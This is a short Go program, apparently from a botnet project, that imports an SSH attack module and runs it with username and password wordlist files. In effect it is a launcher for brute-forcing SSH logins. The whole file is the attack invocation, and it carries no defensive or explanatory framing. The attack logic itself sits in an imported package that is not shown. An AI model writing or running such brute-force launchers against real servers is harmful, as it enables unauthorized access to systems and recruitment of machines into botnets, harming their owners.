package main

import "gitlab.com/rodzzlessa24/botnet/attacks/ssh"

func main() {
	a := ssh.Attack{
		UsernameFile: "usernames.txt",
		PasswordFile: "passwords.txt",
	}

	a.Run()
}
